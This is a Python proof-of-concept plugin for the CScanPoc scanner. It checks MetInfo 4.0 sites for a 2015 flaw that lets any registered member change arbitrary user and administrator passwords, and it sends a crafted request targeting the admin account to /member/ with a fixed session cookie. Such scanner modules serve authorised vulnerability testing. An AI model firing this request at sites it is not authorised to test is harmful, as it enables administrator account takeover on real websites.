# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'MetInfo_0005'  # 平台漏洞编号，留空
    name = 'MetInfo4.0 任意用户密码修改'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-03-12'  # 漏洞公布时间
    desc = '''
        MetInfo4.0注册会员后，可以修改任意用户和管理员密码，影响特别大，搜索引擎里可以找到上千用MetInfo4.0的企业站，危害特别严重！
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0121863'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MetInfo'  # 漏洞应用名称
    product_version = '4.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '75917e86-a303-4c87-98aa-e804c7d416f4'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2015-0121863
            hh = hackhttp.hackhttp()
            url = self.target + '/member/'
            cookie = 'Cookie: PHPSESSID=9be0lkppmei08qedn56funvje0; CNZZDATA1670348=cnzz_eid%3D24422845-1444377232-%26ntime%3D1444377232'
            data = 'admin_name=admin&Submit=+%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81+'
            code, head, res, errcode, _ = hh.http(
                url, cookies=cookie, data=data)
            if code == 200 and 'index_member.php?lang=cn' in res:
                #security_hole(url + "   :任意用户密码修改")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
